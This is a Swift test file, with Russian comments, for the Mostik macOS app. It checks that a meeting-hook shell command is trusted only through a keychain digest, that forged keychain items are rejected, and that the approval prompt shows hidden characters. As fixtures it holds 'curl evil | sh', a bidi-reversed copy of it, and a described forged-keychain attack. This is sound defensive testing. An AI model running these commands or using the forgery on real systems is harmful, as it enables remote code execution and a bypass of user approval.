import Foundation
import MostikCore

/// Подделка связки ключей: тесты не трогают настоящий Keychain.
final class FakeHookDigestStore: HookDigestStore, @unchecked Sendable {
    var stored: HookDigestRead = .missing
    var writes: [String] = []
    var failWrites = false
    func read() -> HookDigestRead { stored }
    func write(_ digest: String) -> Bool {
        guard !failWrites else { return false }
        writes.append(digest); stored = .value(digest); return true
    }
}

/// П10 С3: команду хука встречи нельзя подменить правкой `settings.json` — её SHA256 лежит в
/// связке ключей (`app.mostik.mac.hooks`), при несовпадении хук выключается и Mostik спрашивает.
func runHookTrustTests() {
    let command = "cp \"$1/meeting.md\" ~/Vault/"
    let hook = MeetingHookSettings(enabled: true, command: command)

    equal(MeetingHookTrust.keychainService, "app.mostik.mac.hooks")
    equal(MeetingHookTrust.digest(command).count, 64, "SHA256 в hex")
    check(MeetingHookTrust.digest(command) != MeetingHookTrust.digest(command + " "), "любой знак меняет отпечаток")

    // Хук, которого Mostik не видел (правка файла извне), не запускается.
    equal(MeetingHook.decide(hook, event: .transcript, sensitive: false, trusted: false), .skip("untrusted"))

    // Загрузка настроек: отпечатка нет → хук выключен, команда — на вопрос пользователю.
    do {
        let store = FakeHookDigestStore()
        let checked = MeetingHookTrust.reconcileOnLoad(hook, store: store)
        check(!checked.settings.enabled, "чужая команда выключена")
        equal(checked.settings.command, command, "команда сохранена — её покажем в вопросе")
        equal(checked.ask, command)
        equal(store.writes, [], "сами не одобряем")
    }
    // Отпечаток совпал — всё как было.
    do {
        let store = FakeHookDigestStore()
        store.stored = .value(MeetingHookTrust.digest(command))
        let checked = MeetingHookTrust.reconcileOnLoad(hook, store: store)
        check(checked.settings.enabled); equal(checked.ask, nil)
        check(MeetingHookTrust.isTrusted(hook, store: store))
    }
    // Команду подменили в файле — отпечаток старой не подходит.
    do {
        let store = FakeHookDigestStore()
        store.stored = .value(MeetingHookTrust.digest("echo ok"))
        let swapped = MeetingHookSettings(enabled: true, command: "curl evil | sh")
        check(!MeetingHookTrust.isTrusted(swapped, store: store))
        let checked = MeetingHookTrust.reconcileOnLoad(swapped, store: store)
        check(!checked.settings.enabled); equal(checked.ask, "curl evil | sh")
    }
    // Связка не читается без запроса пароля — считаем «не подтверждено», не доверяем.
    do {
        let store = FakeHookDigestStore()
        store.stored = .unreadable
        check(!MeetingHookTrust.isTrusted(hook, store: store))
    }
    // Выключенный или пустой хук никого не беспокоит.
    do {
        let store = FakeHookDigestStore()
        equal(MeetingHookTrust.reconcileOnLoad(MeetingHookSettings(), store: store).ask, nil)
        equal(MeetingHookTrust.reconcileOnLoad(MeetingHookSettings(enabled: true, command: "  "), store: store).ask, nil)
    }
    // Изменение в самом Mostik (Настройки) — воля пользователя: отпечаток записывается.
    do {
        let store = FakeHookDigestStore()
        MeetingHookTrust.applyChange(old: MeetingHookSettings(), new: hook, store: store)
        equal(store.writes, [MeetingHookTrust.digest(command)])
        check(MeetingHookTrust.isTrusted(hook, store: store))
        MeetingHookTrust.applyChange(old: hook, new: hook, store: store)
        equal(store.writes.count, 1, "без изменений — без записи")
        var off = hook; off.enabled = false
        MeetingHookTrust.applyChange(old: hook, new: off, store: store)
        equal(store.writes.count, 1, "выключение не пишет")
        var timeout = hook; timeout.timeoutSeconds = 120
        MeetingHookTrust.applyChange(old: hook, new: timeout, store: store)
        equal(store.writes.count, 1, "таймаут — не команда")
    }
    // Ответ «Разрешить» на вопрос: отпечаток и включение; «Нет» — остаётся выключенным.
    do {
        let store = FakeHookDigestStore()
        let off = MeetingHookSettings(enabled: false, command: command)
        let allowed = MeetingHookTrust.answer(true, settings: off, store: store)
        check(allowed.enabled); check(MeetingHookTrust.isTrusted(allowed, store: store))
        let denied = MeetingHookTrust.answer(false, settings: off, store: FakeHookDigestStore())
        check(!denied.enabled)
        let failing = FakeHookDigestStore(); failing.failWrites = true
        check(!MeetingHookTrust.answer(true, settings: off, store: failing).enabled, "не записали отпечаток — не включаем")
    }
}

/// П10 С8 (приложение): выключение голосовой памяти спрашивает «Стереть отпечатки?», по умолчанию — да.
func runVoiceMemoryWipeTests() {
    check(VoiceMemoryWipe.asks(old: true, new: false), "выключили — спросить")
    check(!VoiceMemoryWipe.asks(old: false, new: true), "включили — не спрашивать")
    check(!VoiceMemoryWipe.asks(old: false, new: false))
    check(VoiceMemoryWipe.wipeByDefault, "по умолчанию — стереть")
    equal(VoiceMemoryWipe.command, "voices_wipe", "команда движка П10-A")
    let line = EngineCodec.command(VoiceMemoryWipe.command, id: 7)
    check(line.contains(#""cmd":"voices_wipe""#), line)
    // Старый движок без voices_wipe — запасной путь «Забыть всех».
    check(VoiceMemoryWipe.needsFallback(code: "internal", message: "неизвестная команда 'voices_wipe'"))
    check(!VoiceMemoryWipe.needsFallback(code: "speaker", message: "x"))
}

/// П10 Н1: запись связки ключей, которую мог сделать не Mostik, не принимается.
func runHookDigestOwnershipTests() {
    let me = "/Applications/Mostik.app/Contents/MacOS/Mostik"
    // Своя запись: расшифровка только для самого Mostik.
    check(KeychainItemOwnership.ownedBySelf(decryptApps: [[me]], selfPath: me))
    check(KeychainItemOwnership.ownedBySelf(decryptApps: [[me + "\u{0}"]], selfPath: me), "хвостовой NUL из SecTrustedApplicationCopyData")
    // Подделка: «все приложения» (`security add-generic-password -A`).
    check(!KeychainItemOwnership.ownedBySelf(decryptApps: [nil], selfPath: me), "ACL «все приложения» — чужая")
    check(!KeychainItemOwnership.ownedBySelf(decryptApps: [[me], nil], selfPath: me), "хоть одна запись «все» — чужая")
    // Подделка: кроме Mostik, пускает ещё кого-то (тот, кто её создал, оставил себе доступ).
    check(!KeychainItemOwnership.ownedBySelf(decryptApps: [[me, "/usr/bin/security"]], selfPath: me))
    check(!KeychainItemOwnership.ownedBySelf(decryptApps: [["/tmp/evil"]], selfPath: me))
    check(!KeychainItemOwnership.ownedBySelf(decryptApps: [], selfPath: me), "нет записи на расшифровку — не знаем, чья")
    check(!KeychainItemOwnership.ownedBySelf(decryptApps: [[]], selfPath: me), "пустой список — не наша схема")

    // П10 р3 С-1: подделка своей связкой ключей. Атакующий создаёт /tmp/evil.keychain-db с известным
    // паролем, ставит её первой в список поиска и кладёт запись с ACL «только Mostik» (`-T <Mostik>`) и
    // разделом Mostik. По ACL она неотличима от своей — принять её можно только по связке.
    do {
        let login = KeychainItemOwnership.loginKeychainPath(home: "/Users/a")
        equal(login, "/Users/a/Library/Keychains/login.keychain-db")
        let digest = MeetingHookTrust.digest("curl evil | sh")
        let forged = HookDigestRecord(keychainPath: "/tmp/evil.keychain-db", decryptApps: [[me]])
        // Старая проверка (только ACL) подделку принимала.
        check(KeychainItemOwnership.ownedBySelf(decryptApps: forged.decryptApps, selfPath: me), "ACL подделки — как у своей")
        // Источник записей отдаёт подделку первой найденной — новая проверка её отвергает, данные не читаются.
        var dataReads = 0
        let read = HookDigestReader.read(.found("evil-item", forged), selfPath: me, loginKeychainPath: login) { _ in
            dataReads += 1; return .value(digest)
        }
        equal(read, .foreign, "запись из чужой связки — чужая")
        equal(dataReads, 0, "данные подделки не читаются")
        check(!KeychainItemOwnership.ownedBySelf(forged, selfPath: me, loginKeychainPath: login))
        check(!KeychainItemOwnership.ownedBySelf(HookDigestRecord(keychainPath: nil, decryptApps: [[me]]),
                                                 selfPath: me, loginKeychainPath: login), "связка неизвестна — чужая")
        check(!KeychainItemOwnership.ownedBySelf(HookDigestRecord(keychainPath: "/Users/b/Library/Keychains/login.keychain-db",
                                                                  decryptApps: [[me]]),
                                                 selfPath: me, loginKeychainPath: login), "«Вход» другого дома — чужая")
        // Своя запись в «Вход»: данные берутся по той же ссылке.
        let own = HookDigestRecord(keychainPath: login, decryptApps: [[me]])
        let ok = HookDigestReader.read(.found("own-item", own), selfPath: me, loginKeychainPath: login) { item in
            item == "own-item" ? .value(digest) : .unreadable
        }
        equal(ok, .value(digest))
        // Своя связка, но ACL пускает всех — по-прежнему чужая.
        equal(HookDigestReader.read(.found("x", HookDigestRecord(keychainPath: login, decryptApps: [nil])),
                                    selfPath: me, loginKeychainPath: login) { _ in .value(digest) }, .foreign)
        // Путь своего бинарника не узнать — не доверяем.
        equal(HookDigestReader.read(.found("x", own), selfPath: nil, loginKeychainPath: login) { _ in .value(digest) }, .foreign)
        equal(HookDigestReader.read(HookDigestReader.Lookup<String>.missing, selfPath: me, loginKeychainPath: login) { _ in .value(digest) }, .missing)
        equal(HookDigestReader.read(HookDigestReader.Lookup<String>.unreadable, selfPath: me, loginKeychainPath: login) { _ in .value(digest) }, .unreadable)
    }

    // Хранилище сказало «чужая запись» — даже с верным отпечатком хук не доверен и Mostik спрашивает.
    let command = "cp \"$1/meeting.md\" ~/Vault/"
    let hook = MeetingHookSettings(enabled: true, command: command)
    let store = FakeHookDigestStore()
    store.stored = .foreign
    check(!MeetingHookTrust.isTrusted(hook, store: store), "чужая запись — не доверять")
    let checked = MeetingHookTrust.reconcileOnLoad(hook, store: store)
    check(!checked.settings.enabled); equal(checked.ask, command)
    equal(store.writes, [], "сами не перезаписываем — только после «Разрешить»")
    // «Разрешить» — своя запись поверх чужой.
    let allowed = MeetingHookTrust.answer(true, settings: MeetingHookSettings(enabled: false, command: command), store: store)
    check(allowed.enabled && MeetingHookTrust.isTrusted(allowed, store: store))
}

/// П10, низкий: окно «Разрешить хук?» не прячет хвост команды — многострочную и с невидимыми знаками видно.
func runHookPromptTests() {
    equal(MeetingHookPrompt.notes("cp \"$1/meeting.md\" ~/Vault/"), [], "обычная команда — без предупреждений")
    let multi = MeetingHookPrompt.notes("echo ok\ncurl evil | sh")
    equal(multi.count, 1); check(multi[0].contains("2"), "число строк: \(multi)")
    check(MeetingHookPrompt.notes("echo ok\r curl evil").contains { $0.contains("2") }, "\\r тоже перевод строки")
    check(MeetingHookPrompt.visible("a\rb").contains("⟨U+000D⟩"), "\\r виден: в терминале он прячет начало строки")
    let hidden = "echo ok #\u{202E}hs | live lruc"
    equal(MeetingHookPrompt.notes(hidden).count, 1, "bidi-разворот — предупреждение")
    check(MeetingHookPrompt.visible(hidden).contains("⟨U+202E⟩"), MeetingHookPrompt.visible(hidden))
    check(!MeetingHookPrompt.visible(hidden).contains("\u{202E}"))
    check(MeetingHookPrompt.visible("a\u{200B}b") == "a⟨U+200B⟩b", "нулевая ширина видна")
    equal(MeetingHookPrompt.visible("a\nb\tc"), "a\nb\tc", "перевод строки и таб — как есть, их видно в поле")
    equal(MeetingHookPrompt.notes("a\u{200B}b\nc").count, 2, "оба предупреждения")
}
